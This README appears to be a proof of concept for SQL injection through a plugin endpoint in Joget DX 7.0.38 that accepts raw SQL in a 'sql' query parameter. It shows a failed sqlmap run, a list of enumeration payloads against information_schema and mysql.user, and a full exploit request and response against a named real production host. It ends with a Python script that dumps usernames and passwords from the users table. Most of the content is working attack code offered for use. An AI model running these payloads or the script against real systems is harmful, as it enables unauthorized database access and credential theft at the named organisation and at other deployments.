# joget-dx7-sql_injection-exploit

A PoC for SQL Injection in Joget DX 7.0.38 application. This PoC allows attacker to enumerate the databases and tables, ip address of the MySQL server as well as enumerate for username and their privileges. 

# Initial Encounter
When exploring the application, we found the following request being called by the application with following response:
```HTTP
GET /jw/web/json/plugin/[REDACTED]/service?raw=yes&sql=select%20ITEM%20from%20TABLE HTTP/2
Host: REDACTED[.]com[.]my
Cookie: JSESSIONID=...; JSESSIONID=...; JSESSIONID=...
```

```http
HTTP/2 200 OK
Content-Type: application/json;charset=utf-8
...

[
	{
		"ITEM":"DATA"
	}
]
```
The sql query is URL encoded. Immediately, we try to use SQLMap, an atuomated tool for detecting and exploiting SQL injection flaws. 
# Failed SQLMap Attempt
Saving the above request, we used `sqlmap -r request.txt`. However, the URL itself contains SQL query, which is normal application behaviour, could cause certain problems. Due to the application's architecture, the connection failed and we were forced to inject manually.

```
$ sqlmap -r request.txt --random-agent
        ___
       __H__              
 ___ ___[.]_____ ___ ___                   
|_ -| . [']     | .'| . |           
|___|_  ["]_|_|_|__,|  _|            
      |_|V...       |_|   https://sqlmap.org              

[*] starting @ 10:55:13 /2024-06-26/

[10:55:13] [INFO] parsing HTTP request from 'request.txt'
[10:55:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                      
[10:55:13] [WARNING] it appears that you have provided tainted parameter values ('sql=select item from table') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[10:55:32] [INFO] testing connection to the target URL
[10:56:02] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[10:56:02] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with proxy switches ('--proxy', '--proxy-file'...)     
[10:56:32] [CRITICAL] connection timed out to the target URL                 

[*] ending @ 10:56:32 /2024-06-26/                   
```

# Payloads
The following are the successful payloads that allow us to perform information gathering and enumeration.

```sql
# Retrieves database version, username, ip address
SELECT @@VERSION, USER()

# Retrieves all database name
Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

# Retrieves all table for one database
Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

# Retrieves information on user: root
select * from mysql.user where user='root'; 

# Identify Tables Containing "user"
SELECT 1,2,3,group_concat(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema='table' AND table_name LIKE '%user%';

# Identify Columns in the "users" Table
SELECT 1,2,3,group_concat(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_schema='table' AND table_name='users';
```

## Sample Exploit:
```http
GET /jw/web/json/plugin/org.sunway.sunway_common_plugins.fetchdataAPI.SunwayTableDataFetch/service?raw=yes&sql=SELECT%201%2c2%2c3%2cgroup_concat(0x7c%2ctable_name%2c0x7C)%20FROM%20information_schema.tables%20WHERE%20table_schema%3d'table'%20AND%20table_name%20LIKE%20'%25user%25' HTTP/2
Host: cloudapps.sunway.com.my
Cookie: JSESSIONID=...
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Accept: */*
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: [REDACTED]
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=100000, i
```

```HTTP
HTTP/2 200 OK
Date: Wed, 26 Jun 2024 09:00:33 GMT
Content-Type: application/json;charset=utf-8
Set-Cookie: JSESSIONID=d1f6d985c7e7d052c9cad04b0d3288ea; expires=Wed, 26-Jun-24 11:00:33 GMT; max-age=7200; domain=cloudapps.sunway.com.my; httponly; secure; path=/jw
X-Content-Type-Options: nosniff
X-Content-Type-Options: nosniff
X-Content-Type-Options: nosniff
Content-Security-Policy: frame-ancestors 'self';
Strict-Transport-Security: max-age=31536000; includeSubDomains
Cross-Origin-Resource-Policy: same-origin
Permissions-Policy: geolocation=(), midi=(), camera=()
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Cross-Origin-Opener-Policy: same-origin
Clear-Site-Data: cache, cookies, storage
Cross-Origin-Embedder-Policy: require-corp
Cf-Cache-Status: DYNAMIC
Server: cloudflare
Cf-Ray: 899c01f67816494f-SIN

[
	{
	"1":"1",
	"2":"2",
	"3":"3",
	"group_concat(0x7c,table_name,0x7C)":"|USERTABLE1|,...,|USERTABLE_N"
	}
]
```

# Python Script
```python
import requests

# Base URL and endpoint
base_url = 'http://target.com/vulnerable_endpoint'

# Your authenticated session ID (JSESSIONID) obtained after logging in
session_cookies = {
    'JSESSIONID': 'your_jsessionid_here'
}

# Function to send the SQL injection payload
def send_payload(payload):
    params = {
        'yes': 'yes',
        'sql': payload
    }
    response = requests.get(base_url, params=params, cookies=session_cookies)
    if response.status_code == 200:
        return response.text
    else:
        print("Request failed with status code:", response.status_code)
        return None

# Payload to identify tables containing "user"
tables_payload = "SELECT 1,2,3,group_concat(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema='jwdb' AND table_name LIKE '%user%';"
tables_result = send_payload(tables_payload)
print("Tables containing 'user':", tables_result)

# Assuming the table name is 'users' and it contains 'username' and 'password' columns
# Payload to identify columns in the 'users' table
columns_payload = "SELECT 1,2,3,group_concat(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_schema='jwdb' AND table_name='users';"
columns_result = send_payload(columns_payload)
print("Columns in 'users' table:", columns_result)

# Payload to extract usernames and passwords from 'users' table
data_payload = "SELECT 1,2,3,group_concat(0x7c,username,0x7c,password,0x7C) FROM jwdb.users;"
data_result = send_payload(data_payload)
print("Usernames and passwords:", data_result)
 
```
# Reference: 
- https://book.hacktricks.xyz/pentesting-web/sql-injection#extract-database-names-table-names-and-column-names
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
- https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss
